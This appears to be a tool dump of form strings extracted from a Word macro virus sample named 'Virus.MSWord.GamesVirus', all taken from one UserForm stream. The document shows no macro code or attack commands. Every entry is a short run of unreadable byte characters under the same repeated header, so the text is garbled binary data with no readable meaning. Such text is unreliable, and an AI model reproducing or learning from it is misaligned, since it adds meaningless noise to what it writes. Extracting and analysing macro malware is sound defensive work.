9Q2Ri3Zy*Ri4cy2Rq)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!Ja2Rq)Ji2Rq2Rq)Ji1Ji*Ri!Ja)Ja)Ja2Rq;Zy3Zy;Zy<cy4c�2Rq*Ri*Rq2Rq Ba3Zy<c� BY3Zq;Zy3Zy2Rq3Zq2Rq3Zy3Zq(Ba)Ja BY BY)Ji*Ri*Ri!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ri Ba BQ)JY)Ja)Ja)Ja BY BY2Ri)Ja)Ji1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY"Ra*Ri3ZqDc�CZy1Ji'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I BY*Rq2Rq;Zy2Rq'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba!Ji"Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)JiDcy3Zq3Zy2Rq)Ji2Rq*Ri*Ri*Rq3ZqMk�Dcy3Zy2Rq*Ri Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji2Rq3Zy<c�(BY)Ja2Rq)Ji1Ji)Ja)Ja2Rq(Ba*Ri2Rq*Ri*Ri)Ji)Ji*Rq)Ji Ba)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I(Ba BY)Ja2Rq)Ji(Ba(Ba)Ji2Rq)Ja*Ri<c�)Ji<c�;Zy BY)Ji)Ja)Ji2Rq*Rq2Rq)Ji'9Y(Ba)Ji*Ri3Zy<cy3Zy)Ja)Ja2Rq)Ji BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(Ba(Ba2Ri1Ji2Ri)Ji1Ji2Ri4cqDcy2Ri1Ji1Ji)Ja(Ba2Ri<cy2Rq)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY)Ja2Rq2Rq BY(Ba)Ji(Ba(Ba)Ji BY BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I'9Q(BY)Ja1Ji)Ji)Ji)Ja1Ji3Zq2Ri(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba2Rq3Zy<c�<c� BY(Ba(Ba)Ji;Zy;Zy2Rq1Jq(Ba2Rq'9Y1Ja;Zq3Zq2Ri(Ba(Ba1Ji)Ja3Zq<c�;Zy3Zy2Rq2Ri2Rq2Rq(Ba)Ja(Ba)Ji;Zy<c�)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y2Rq(Ba BY)Ji)Ji(Ba)Ji)Ji2Rq2Rq Ba(Ba(Ba BY BY'9Q)Ji;Zy)Ji(Ba(BY BY Ba Ba)Ji)Ja Ba)Ji2Rq2Rq2Rq2Rq*Ri!Jq Ba BY!JY Ba)Ji2Rq2Rq3Zy4cy3Zy<c�3Zy)Ji)Ja!Ja2Rq2Rq*Ri<c�<c�;Zy(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Bi'9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba2Rq+Zq-ky<cy>s�Fs�=k�)Ja)Ja(Ba)Ja2Rq2Rq)Ji(Ba'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY(Bi(Ba(Ba2Rq;Zy<c�3Zq!Ja*Ri*Ri)Ji1Ji(Ba2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y(BY)Ji3Zq<c�(Ba)Ja2Rq2Rq2Rq2Rq3Zq;Zy;Zy<c�2Ri)Ja(Ba)Ja Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji4c�2Ry2Rq2Ri2Rq)Ji)Ji(Ba BY2Ri2Rq1Ji)Ji2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I Ba(BY)Ji)Ja;Zy2Rq(Ba&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 BY'9Q'9Y BY BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q*Ri BY BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja(BY BQ BY BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y*Ri2Rq BY*Ri2Ri BY(Ba1Ji;Zy2Rq)Ja BY'9Y!Ja*Rq<c�<c�;Z�)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba2Rq3Zy'9Y2Rq3Zq2Rq*Rq'9Q)Ja)Ji2Ri*Ri3Zy)Ji*Rq<c�<cy BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y)Ja)Ja(Ba)Ji<cy<c�3Zy3Zq1Ji<cy2Rq)Ja'9Q(Ba*Ri3Zy;Zy3Zy<c�<c�<cy3Zq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY2Rq3Zy2Rq BY)Ja1Ji)Ja)Ji!Ja BY)Ja)Ji)Ja)Ja)Ji)Ji2Rq2Rq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I(Ba)Ji2Rq*Rq)Ja)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji3Zq;Zy)Ji)Ji)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y(Ba*Rq<c�4cy+Zq3Zq;Zq2Rq2Rq2Rq;Zy3Zq*Rq Ba*Ri)Ji*Rq*Rq*Rq3Zq*Ri)Ji Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY(Ba3Zy<c�=k�*Rq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y'9Y(Ba)Ji BY(Ba BY BY*Ri*Ri)Ja)Ja3Zi)Ja BY)Ja)Ji)Ji2Rq)Ja*Ri*Rq!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba)Ji)Ja)Ji2Rq(Ba2Rq)Ja BY2Ri)Ji!Ja;Zy3Zy2Rq)Ja<c�2Rq;Zy<cy<c�Ek�*Ri BY'9Q BY)Ji)Ja)Ja(Ba)Ja BY*Rq*Ry2Ry(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji3Zq'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja)Ja'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BQ(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY(Ba(Ba)Ja2Rq)Ji)Ja(Ba1Ji)Ji)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y(BY BQ2Rq)Ji BY(Ba(Ba(Ba1Ji)Ji2Rq)Ji)Ji2Rq BQ)Ja)Ji(Ba BY(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A3Zy2Ri BY'9Y BY3Zy2Rq*Rq BY BY)Ja2Rq*Rq*Rq2Rq'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q;Zy3Zy)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba)Ji)Ji BY!Ja)Ja(Ba BY(Ba BY BY3Zq*Rq2Rq*Ri*Ri)Ji2Ri2Ri)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba;Zy;Zy1Ji)Ja*Ri)Ji(Ba(BY'9Y BY(Ba2Ri)Ji)Ja(BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja3Zy;Zy;Zy3Zq2Rq"Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba*Ri<cy)Ja(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY)Ja2Ri2Ri Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!Ja*Ri3Zy3Zq4cy4cy2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Bi2Rq3Zq"Rq Ba!Jq*Rq3Zq*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Ba Ba'9Y BY!Ja*Ri1Ji*Ri)Ji)Ja*RiDc�2Rq*Ri)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q1Ji2Rq2Rq*Ri BY BY1Ji)Ja)Ja)Ja BY)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY*Rq*Ri BY1Ji(Ba2Rq<c�<cy3Zy)Ja'9Q BY*Ri2Rq)Ja*Ri2Rq Ba'9Y2Rq*Ri BY*Ri)Ji)Ji)Ji)Ji)Ji*Rq)Ja)Ja*Ri2Rq2Rq(Ba)Ja)Ja(BY(Ba'9Q BY(Ba BY)Ja1Ji2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Ji1Ji*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(Ba2Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A2Rq BY2Ri2Rq2Rq;Zy)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja*Ri2Rq2Rq2Rq;Zy2Rq'9Q)Ja)Ja BY)Ja)Ji(Ba'9Q2Rq<c�;Zy)Ji2Rq3Zy2Ri1Ji)Ja'9Y Ba)Ji1Ji<cy=k�*Ri*Ri;Zy3Zy*Ri(Ba(BY BY)Ji)Ji*Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q;Zy1Ji(Ba)Ji)Ja(BY(Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY)Ja2Rq2Rq2Ri)Ja2Rq)Ja2Rq<c�Ek�Dc�*Ri2Rq)Ja2Ri;Zy2Rq)Ji1Ji BY1Ji;Zy)Ji BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq Ba)Ja)Ja)Ja2Rq*Rq)Ji(BY Ba!Ji*Rq Bi!Ji Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY(BY)Ja*Rq;Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY BY)Ji Bi BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y'9a Ba Ba)Ji2Ri3Zq)Ja Ba!Ji3Zy Bi!Ja Ba*Ri)Ji BY Ba'9a BY(BY'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY3Zy<cy<c�3Zy2RiBRqCZq)Ja)Ji*Ri;ZyDc�3Zy<cyKZq:Ri2Ri2Ri3Zq<cq*Ri!Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba BY'9Q)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y)Ja)Ji(Ba(BY(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I2Rq)Ji)Ji(Ba'9Y)Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q=k�<c�2Rq1Ji)Ja BY2Rq)Ji2Rq2Rq(BY&1Q)Ja2Rq3Zy3Zy;Zy3Zy*Ri)Ji3Zy)Ji3Zy2Rq1Ji2Rq3Zq2Rq1Ji2Ri'9Y'9Q)Ja2Ry+Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(BY)Ja)Ji)Ja)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji2Rq3Zq3Zq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I*Ri)Ji(Ba(Ba BQ(Ba(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9Q2Ri*Ri)Ja)Ji)Ja)Ji*Ri'9Q Ba BQ'9Q BY Ba1Ji*Ri)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji*Ri)Ji*Rq2Rq(Ba BY)Ji BY!Ja3Zy<cy<cy2Rq)Ja&1Q1Ji(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q*Ri)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba1Ji*Ri2Rq3Zy)Ja1Ji*Ri3Zy3Zy)Ja BY2Rq2Rq2Rq)Ji)Ji2Rq2Rq BY BY3Zy)Ji*Rq3Zy*Rq!Ji*Rq<c�+Zq(Ba(BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba*Ri4cy3Zq*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY)Ja*Ri3Zy<cy<cy2Rq!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Bi)Ji*Ri<c�)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ji*Rq*Ri!Ji Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a*Ri*RiMky;Zq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y!Ji!Ji*Rq4cyDc�!Ja!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba"Ri!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ja<c�<c�*Ri0Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y*Ri*Ri=k�Dc�*Ra2Ri*Ri!Ja!Ja!Ja)Jq2Rq'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y'9Y BY(Ba1Ji)Ja3Zq(BY Ba)Ja2Ri2Rq)Ji BY(Ba(Ba*Ri2Rq3Zy3Zq2Rq)Ja Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji2Ri BY*Ri2Rq2Rq2Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja2Rq)Ji BY(Ba)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I&1I2Rq*Ri)Ja1Ji3Zq<cy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(BY)Ja'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(Ba1Ji)Ja(BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
